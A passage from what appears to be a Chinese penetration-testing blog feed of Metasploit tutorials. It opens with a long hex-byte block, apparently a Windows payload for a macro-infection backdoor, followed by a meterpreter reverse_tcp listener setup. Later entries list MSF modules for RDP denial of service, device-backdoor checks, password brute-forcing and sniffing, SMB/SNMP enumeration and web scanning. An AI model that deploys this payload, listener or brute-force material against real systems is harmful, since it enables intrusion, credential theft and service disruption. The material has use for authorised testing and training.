26&amp;H43&amp;H7D&amp;HF2&amp;H89&amp;H15&amp;HE9&amp;H33&amp;H05&amp;H0A&amp;H54&amp;HBD&amp;H2E&amp;HA5&amp;H3F&amp;H06&amp;HD1&amp;HD3&amp;H12&amp;H95&amp;HF1&amp;H37&amp;H43&amp;HD1&amp;HF1&amp;H91&amp;H03&amp;H94&amp;H0D&amp;HF7&amp;HFA&amp;HDD&amp;H63&amp;H16&amp;H85&amp;HDB&amp;H8F&amp;HF0&amp;HD0&amp;H74&amp;HE0&amp;HA6&amp;HD4&amp;HF2&amp;H4A&amp;H60&amp;H55&amp;HD2&amp;H2F&amp;H4E&amp;H5E&amp;H8B&amp;H61&amp;H13&amp;HE8&amp;H84&amp;H28&amp;H70&amp;H6C&amp;HB9&amp;H1B&amp;H09&amp;H15&amp;H31&amp;HD8&amp;H4D&amp;H5A&amp;H7D&amp;H79&amp;H2A&amp;H01&amp;H47&amp;HD4&amp;HE4&amp;HB3&amp;HF2&amp;HED&amp;HDA&amp;H3B&amp;HFD&amp;HCD&amp;H74&amp;HEB&amp;H48&amp;H21&amp;H32&amp;HF7&amp;H67&amp;H48&amp;HAF&amp;H54&amp;H39&amp;HA6&amp;H8C&amp;H85&amp;H1B&amp;HA3&amp;H06&amp;H68&amp;H78&amp;HAD&amp;H20&amp;H1D&amp;H1C&amp;HD1&amp;H1D&amp;H2B&amp;H1B&amp;H6E&amp;HA2&amp;H26&amp;HBA&amp;H13&amp;H33&amp;H42&amp;HC1&amp;H2B&amp;H08&amp;H89&amp;H6A&amp;HD3&amp;H18&amp;H41&amp;H85&amp;H72&amp;HD0&amp;HDC&amp;H7C&amp;H87&amp;H31&amp;H2A&amp;H1F&amp;H4E&amp;H3C&amp;HCE&amp;H64&amp;HD1&amp;H14&amp;HF3&amp;H17&amp;HF9&amp;H09&amp;H79&amp;H26&amp;HB6&amp;H8F&amp;H23&amp;HAA&amp;H47&amp;H39&amp;HEA&amp;H69&amp;H1D&amp;H18&amp;HCE&amp;H00&amp;H97&amp;HF7&amp;H76&amp;H55&amp;H2A&amp;H58&amp;H4A&amp;H44&amp;HFC&amp;H81&amp;H79&amp;HA8&amp;HC4&amp;H82&amp;H75&amp;HCF&amp;H3B&amp;H59&amp;H67&amp;H9C&amp;HA1&amp;HD7&amp;HA7&amp;H48&amp;HEC&amp;H50&amp;HB5&amp;H6A&amp;HB4&amp;H6D&amp;HC8&amp;H54&amp;H27&amp;HD6&amp;H22&amp;HEB&amp;H34&amp;HA5&amp;H78&amp;HD9&amp;H4E&amp;HF1&amp;HD7&amp;H80&amp;HF4&amp;H72&amp;HB0&amp;HE8&amp;HD5&amp;H5B&amp;HA1&amp;H39&amp;HD7&amp;H79&amp;HB7&amp;H84&amp;H4A&amp;H9A&amp;H5B&amp;HEF&amp;HAE&amp;H32&amp;H75&amp;H05&amp;H8E&amp;H63&amp;H48&amp;H2D&amp;H9C&amp;HD1&amp;H62&amp;H85&amp;H50&amp;H0A&amp;H57&amp;H52&amp;H27&amp;H3A&amp;H0A&amp;H69&amp;H56&amp;HDC&amp;H0B&amp;HD7&amp;H0C&amp;H7C&amp;HE8&amp;HEE&amp;H3E&amp;H09&amp;H1F&amp;H14&amp;HD8&amp;HCE&amp;H2F&amp;H7D&amp;H0C&amp;H46&amp;H43&amp;H89&amp;H03&amp;H82&amp;HE4&amp;HA4&amp;HA0&amp;H53&amp;H02&amp;H0C&amp;HA5&amp;HEB&amp;H04&amp;H1E&amp;HFC&amp;H2F&amp;HE9&amp;H97&amp;HC2&amp;H29&amp;H37&amp;HF6&amp;H9B&amp;HBF&amp;H0A&amp;H44&amp;HBA&amp;HA2&amp;H31&amp;HEB&amp;H78&amp;H70&amp;H1A&amp;H8A&amp;HCD&amp;H20&amp;H90&amp;HE4&amp;HBF&amp;H08&amp;H1F&amp;H1C&amp;H2A&amp;H81&amp;H85&amp;H0C&amp;HB2&amp;HD4&amp;HA1&amp;HFC&amp;H26&amp;HB3&amp;HCB&amp;H7B&amp;HAA&amp;H89&amp;H05&amp;HD0&amp;H43&amp;HCB&amp;H13&amp;H5E&amp;H8F&amp;HA3&amp;H1A&amp;HD9&amp;HDE&amp;H9D&amp;H4B&amp;HA3&amp;H8D&amp;H6D&amp;HF3&amp;HAA&amp;HC2&amp;HAC&amp;HCE&amp;H40&amp;H6F&amp;H71&amp;H20&amp;HC8&amp;H18&amp;H15&amp;H07&amp;H94&amp;H28&amp;HD9&amp;HDD&amp;H8E&amp;HCF&amp;H86&amp;HB2&amp;HA1&amp;H34&amp;HEC&amp;H2C&amp;H0A&amp;HE5&amp;HF5&amp;H6A&amp;HC3&amp;HB9&amp;H35&amp;H14&amp;HE9&amp;H59&amp;HDA&amp;H36&amp;HCD&amp;H16&amp;H5C&amp;HE2&amp;HCB&amp;HB4&amp;H44&amp;H0B&amp;H81&amp;HA9&amp;H78&amp;H4E&amp;HF6&amp;HE3&amp;H83&amp;HD8&amp;HF2&amp;H06&amp;H6C&amp;HDE&amp;H3B&amp;H43&amp;HD4&amp;HF8&amp;H22&amp;H80&amp;H91&amp;H20&amp;H2A&amp;H86&amp;HE5&amp;H98&amp;HF5&amp;HCA&amp;HB6&amp;H04&amp;H10&amp;H2B&amp;HED&amp;H6E&amp;HEA&amp;H78&amp;HA4&amp;H64&amp;HF7&amp;H58&amp;HC5&amp;H3C&amp;H02&amp;H4E&amp;H53&amp;H85&amp;H35&amp;HBC&amp;H66&amp;HC7&amp;H39&amp;HC5&amp;HEA&amp;HD9&amp;H09&amp;H3D&amp;HFF&amp;H4B&amp;H69&amp;HA4&amp;H16&amp;H15&amp;H70&amp;H3F&amp;H62&amp;H80&amp;H28&amp;HED&amp;HC6&amp;H15&amp;H37&amp;HD0&amp;H6B&amp;HBE&amp;H0D&amp;H3D&amp;H92&amp;H45&amp;HB3&amp;H0A&amp;H88&amp;HA0&amp;HFA&amp;H7A&amp;HF3&amp;H38&amp;H4F&amp;H83&amp;H1C&amp;H7A&amp;HA6&amp;HE5&amp;H0B&amp;H18&amp;H33&amp;H0F&amp;H69&amp;H0B&amp;HDF&amp;H43&amp;H4B&amp;H49&amp;H78&amp;H16&amp;HB8&amp;HE8&amp;HE9&amp;H8F&amp;HDB&amp;H85&amp;H7D&amp;HB0&amp;HFE&amp;H13&amp;H13&amp;H87&amp;H84&amp;H59&amp;H82&amp;H70&amp;HEC&amp;H7C&amp;H5F&amp;H73&amp;HCA&amp;H82&amp;HFE&amp;H44&amp;H47&amp;HA1&amp;H05&amp;H1F&amp;H4C&amp;H2B&amp;HBA&amp;H37&amp;H18&amp;H5E&amp;H03&amp;H11&amp;HAF&amp;H9D&amp;HC8&amp;H0E&amp;H52&amp;H1D&amp;H28&amp;H50&amp;HAC&amp;HD9&amp;H96&amp;HB5&amp;H84&amp;H9B&amp;H9F&amp;H61&amp;H99&amp;HEE&amp;H62&amp;H23&amp;H6B&amp;HE4&amp;H69&amp;H25&amp;H79&amp;H11&amp;HC9&amp;HBC&amp;H9C&amp;HD8&amp;HE1&amp;H86&amp;HCC&amp;HAB&amp;HDC&amp;H25&amp;H26&amp;H40&amp;HF5&amp;H14&amp;H5A&amp;H70&amp;H85&amp;H81&amp;H73&amp;HBD&amp;H9F&amp;H97&amp;H94&amp;HE0&amp;H05&amp;H14&amp;H97&amp;H90&amp;H85&amp;H24&amp;H0A&amp;H24&amp;H45&amp;H0D&amp;H72&amp;H08&amp;H3F&amp;H8C&amp;H33&amp;H6B&amp;H9B&amp;H27&amp;H30&amp;HA8&amp;H11&amp;H0C&amp;HF2&amp;H4E&amp;H20&amp;H9A&amp;H74&amp;H68&amp;H68&amp;H57&amp;HA0&amp;HBA&amp;HE5&amp;HE7&amp;H7C&amp;HDC&amp;H0D&amp;HDB&amp;HC7&amp;H1B&amp;H09&amp;H48&amp;HB5&amp;H53&amp;H76&amp;HD0&amp;H4E&amp;H80&amp;HAE&amp;HAC&amp;HA7&amp;H28&amp;H03&amp;HC1&amp;H94&amp;H96&amp;HBF&amp;HD1&amp;HEA&amp;HC1&amp;H56&amp;HE9&amp;HC0&amp;H79&amp;H95&amp;H52&amp;HE6&amp;H0F&amp;H28&amp;H3C&amp;H25&amp;H34&amp;H56&amp;H15&amp;H8F&amp;HAE&amp;H8F&amp;H68&amp;H03&amp;H81&amp;H4C&amp;HE3&amp;H61&amp;H96&amp;H8C&amp;H0B&amp;H75&amp;HBD&amp;HC0&amp;H7E&amp;HF7&amp;H8B&amp;H13&amp;H49&amp;H5D&amp;H0B&amp;H47&amp;H98&amp;HF4&amp;H6C&amp;H1F&amp;HCA&amp;H1A&amp;H0A&amp;H83&amp;H9B&amp;H48&amp;H2B&amp;H45&amp;H98&amp;H98&amp;H28&amp;H73&amp;H0A&amp;H0E&amp;HF0&amp;H6A&amp;HCF&amp;H2F&amp;H7B&amp;H22&amp;HFC&amp;H58&amp;H24&amp;H94&amp;H38&amp;H0C&amp;HC3&amp;H6E&amp;HD9&amp;HD8&amp;HB8&amp;H05&amp;H24&amp;H64&amp;H2C&amp;H35&amp;HE8&amp;H6A&amp;HD8&amp;HAE&amp;H35&amp;H8B&amp;H48&amp;HAA&amp;H12&amp;HF5&amp;H07&amp;H54&amp;H2D&amp;H65&amp;H4B&amp;H71&amp;H72&amp;H45&amp;H09&amp;H93&amp;HD1&amp;H4B&amp;H14&amp;H7B&amp;H9B&amp;H87&amp;HE1&amp;H28&amp;HDD&amp;H8C&amp;H2C&amp;H72&amp;HA1&amp;HA7&amp;H64&amp;H2D&amp;H72&amp;HE6&amp;H5A&amp;H37&amp;H79&amp;HBB&amp;H06&amp;H78&amp;H9B&amp;HC3&amp;H74&amp;H73&amp;H03&amp;HDB&amp;HDA&amp;H4C&amp;H32&amp;HED&amp;HAC&amp;H36&amp;HF3&amp;H64&amp;HA0&amp;H76&amp;HF2&amp;H78&amp;H10&amp;HB7&amp;H5C&amp;H44&amp;HA8&amp;H6B&amp;H1C&amp;HD7&amp;H33&amp;HB7&amp;HE6&amp;HBC&amp;HA4&amp;H0A&amp;H17&amp;H8E&amp;HB6&amp;H95&amp;H96&amp;H14&amp;H77&amp;H97&amp;HF4&amp;HD4&amp;H49&amp;H6B&amp;HD7&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00</span><br><span class="line">&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H2C&amp;H30&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H54&amp;H30&amp;H00&amp;H00&amp;H38&amp;H30&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H40&amp;H30&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H40&amp;H30&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H9C&amp;H00&amp;H45&amp;H78&amp;H69&amp;H74&amp;H50&amp;H72&amp;H6F&amp;H63&amp;H65&amp;H73&amp;H73&amp;H00&amp;H00&amp;H00&amp;H00&amp;H30&amp;H00&amp;H00&amp;H4B&amp;H45&amp;H52&amp;H4E&amp;H45&amp;H4C&amp;H33&amp;H32&amp;H2E&amp;H64&amp;H6C&amp;H6C&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H7C&amp;HD1&amp;HFC&amp;H2D&amp;H5B&amp;HDE&amp;H92&amp;HE6&amp;HF4&amp;H19&amp;HCF&amp;HBD&amp;HB3&amp;H75&amp;H0F&amp;HC4&amp;HA8&amp;HBF&amp;H60&amp;H34&amp;H1C&amp;H96&amp;H14&amp;H72&amp;HE3&amp;HFE&amp;H61&amp;HED&amp;H46&amp;H58&amp;HD0&amp;H1C&amp;H3B&amp;H06&amp;HB2&amp;HEF&amp;H20&amp;H0D&amp;HAC&amp;H12&amp;HA7&amp;HFB&amp;HD9&amp;H92&amp;H67&amp;H86&amp;HB7&amp;H5B&amp;HB2&amp;H12&amp;HD1&amp;H03&amp;HDB&amp;HC5&amp;H54&amp;HA6&amp;H87&amp;H8A&amp;H8D&amp;H29&amp;H01</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>MsF启动侦听</strong></p><ul><li>use exploit/multi/handler</li><li>set payload windows/meterpreter/reverse_tcp</li><li>set lhost 192.168.190.175</li><li>exploit -j</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 漏洞利用 </category>
          
          <category> MSF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MSF </tag>
            
            <tag> deb后门 </tag>
            
            <tag> flash漏洞 </tag>
            
            <tag> 浏览器漏洞 </tag>
            
            <tag> android后门 </tag>
            
            <tag> 宏感染 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MsF漏洞扫描及加载常用扫描程序</title>
      <link href="/2016/03/09/Exploits/MsF/MsF%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%8F%8A%E5%8A%A0%E8%BD%BD%E5%B8%B8%E7%94%A8%E6%89%AB%E6%8F%8F%E7%A8%8B%E5%BA%8F/"/>
      <url>/2016/03/09/Exploits/MsF/MsF%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%8F%8A%E5%8A%A0%E8%BD%BD%E5%B8%B8%E7%94%A8%E6%89%AB%E6%8F%8F%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<h4 id="MsF弱点扫描"><a href="#MsF弱点扫描" class="headerlink" title="MsF弱点扫描"></a><strong>MsF弱点扫描</strong></h4><ul><li>根据信息收集结果搜索漏洞利用模块</li><li>结合外部漏洞扫描系统对大IP地址段进行批量扫描</li><li>误判率,漏判率</li></ul><p><strong>VNC 密码破解</strong></p><pre><code>use auxiliary/scanner/vnc/vnc_login</code></pre><p><strong>VNC 无密码访问</strong></p><pre><code>use auxiliary/scanner/vnc/vnc_none_authsupported : None, free access!</code></pre><p><strong>RDP远程桌面漏洞</strong></p><pre><code>search ms12_020use auxiliary/scanner/rdp/ms12_020_check    #检查不会造成DoS攻击use auxiliary/dos/windows/rdp/ms12_020_maxchannelids    #DoS攻击模块</code></pre><p><strong>设备后门</strong></p><pre><code>use auxiliary/scanner/ssh/juniper_backdoor        #juniper防火墙后门use auxiliary/scanner/ssh/fortinet_backdoor</code></pre><p><strong>VMWare ESXi 密码爆破</strong></p><pre><code>use auxiliary/scanner/vmware/vmauthd_login        #爆破模块use auxiliary/scanner/vmware/vmware_enum_vms</code></pre><p><strong>利用Web API 远程开启虚拟机</strong></p><pre><code>use auxiliary/admin/vmware/poweron_vm        #管理模块</code></pre><h4 id="HTTP-弱点扫描"><a href="#HTTP-弱点扫描" class="headerlink" title="HTTP 弱点扫描"></a>HTTP 弱点扫描</h4><p><strong>扫描过期证书</strong></p><pre><code>use auxiliary/scanner/http/cert</code></pre><p><strong>扫描目录及文件</strong></p><pre><code>use auxiliary/scanner/http/dir_listing        #目录列表use auxiliary/scanner/http/files_dir        #扫文件</code></pre><p><strong>WebDAV Unicode 编码身份验证绕过</strong></p><pre><code>use auxiliary/scanner/http/dir_webdav_unicode_bypass</code></pre><p><strong>Tomcat 管理登录</strong></p><pre><code>use auxiliary/scanner/http/tomcat_mgr_login</code></pre><p><strong>基于HTTP方法的身份验证绕过</strong></p><pre><code>use auxiliary/scanner/http/verb_auth_bypass</code></pre><p><strong>Wordpress密码破解</strong></p><pre><code>use auxiliary/scanner/http/wordpress_login_enum</code></pre><p><strong>WMAP WEB应用扫描器</strong></p><ul><li>根据SQLMAP的工作方式开发</li></ul><pre><code>load wmap    #msf 加载wmap插件wmap_sites -a http://1.1.1.1wmap_targets -t http://1.1.1.1/mutillidae/index.phpwmap_run -twmap_run -ewmap_vulns -lvulns</code></pre><p><strong>Openvas</strong></p><pre><code>load openvas        #命令行模式,需要配置,使用繁琐db_import openvas.nbe     #导入nbe格式扫描日志</code></pre><p><strong>Nessus</strong></p><pre><code>load nessusnessus_helpnessus_connect admin:toor@1.1.1.1nessus_policy_listnessus_scan_newnessus_report_list</code></pre><p><strong>Nexpose</strong></p><pre><code>导入xml格式日志文件</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 漏洞利用 </category>
          
          <category> MSF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MSF </tag>
            
            <tag> openvas </tag>
            
            <tag> nessus </tag>
            
            <tag> nexpose </tag>
            
            <tag> ms12_020 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用MSF信息收集辅助模块</title>
      <link href="/2016/03/07/Exploits/MsF/%E5%B8%B8%E7%94%A8MSF%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E8%BE%85%E5%8A%A9%E6%A8%A1%E5%9D%97/"/>
      <url>/2016/03/07/Exploits/MsF/%E5%B8%B8%E7%94%A8MSF%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E8%BE%85%E5%8A%A9%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<h4 id="MSF信息收集"><a href="#MSF信息收集" class="headerlink" title="MSF信息收集"></a><strong>MSF信息收集</strong></h4><h5 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a><strong>nmap扫描</strong></h5><pre><code>db_nmap -sV 192.168.1.0/24        #结果保存到msf数据库</code></pre><p><strong>auxiliary/scanner</strong> 辅助扫描模块</p><pre><code>RHOSTS &lt;&gt; RHOSTset RHOSTS 192.168.1.20-192.168.1.30set RHOSTS 192.168.1.0/24,192.168.11.0/24set RHOSTS file:/root/h.txtsearch arpuse auxiliary/scanner/discovery/arp_sweepset INTERFACE eth0 set RHOSTS 192.168.254.0/24    set SHOST            #源地址伪造set SMAC         set THREADS    20        #线程数runsearch portscanuse auxiliary/scanner/portscan/synset INTERFACEset PORTSset RHOSTSset THREADSrun</code></pre><h5 id="nmap-IPID-Idle扫描-扫描IPID递增且空闲的主机"><a href="#nmap-IPID-Idle扫描-扫描IPID递增且空闲的主机" class="headerlink" title="nmap IPID  Idle扫描 扫描IPID递增且空闲的主机"></a><strong>nmap IPID  Idle扫描</strong> 扫描IPID递增且空闲的主机</h5><ul><li>利用MSF查找ipidseq主机</li></ul><pre><code>use auxiliary/scanner/ip/ipidseqset rhosts 192.168.1.0/24runnmap -PN -sl 1.1.1.2 1.1.1.3</code></pre><h5 id="UDP扫描"><a href="#UDP扫描" class="headerlink" title="UDP扫描"></a><strong>UDP扫描</strong></h5><pre><code>search udpuse auxiliary/scanner/discovery/udp_sweepuse auxiliary/scanner/discovery/udp_probe</code></pre><h5 id="密码嗅探"><a href="#密码嗅探" class="headerlink" title="密码嗅探"></a><strong>密码嗅探</strong></h5><pre><code>search snifferuse auxiliary/sniffer/psnufflerun支持从pcap抓包文件中提取密码功能类似于dsniff目前只支持pop3,imap,ftp,HTTP GET协议</code></pre><h5 id="SNMP扫描"><a href="#SNMP扫描" class="headerlink" title="SNMP扫描"></a><strong>SNMP扫描</strong></h5><pre><code>vi /etc/default/snmpd            #侦听地址改为0.0.0.0use auxiliary/scanner/snmp/snmp_loginuse auxiliary/scanner/snmp/snmp_enumuse auxiliary/scanner/snmp/snmp_enumusersuse auxiliary/scanner/snmp/snmp_enumshares</code></pre><h5 id="SMB版本扫描"><a href="#SMB版本扫描" class="headerlink" title="SMB版本扫描"></a><strong>SMB版本扫描</strong></h5><pre><code>#扫描版本信息    use auxiliary/scanner/smb/smb_version    #扫描命名管道,判断SMB服务类型(账号,密码)use auxiliary/scanner/smb/pipe_auditor#扫描通过SMB管道可以访问的RCERPC服务use auxiliary/scanner/smb/pipe_dcerpc_auditor#SMB共享枚举(账号,密码)use auxiliary/scanner/smb/smb_enumshares#SMB用户枚举(账号,密码)use auxiliary/scanner/smb/smb_enumusers#SID枚举(账号,密码)use auxiliary/scanner/smb/smb_lookupsid</code></pre><h5 id="SSH相关扫描模块"><a href="#SSH相关扫描模块" class="headerlink" title="SSH相关扫描模块"></a><strong>SSH相关扫描模块</strong></h5><pre><code>#SSH版本扫描use auxiliary/scanner/ssh/ssh_version#SSH密码爆破use auxiliary/scanner/ssh/ssh_loginset USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txtset VERBOSE 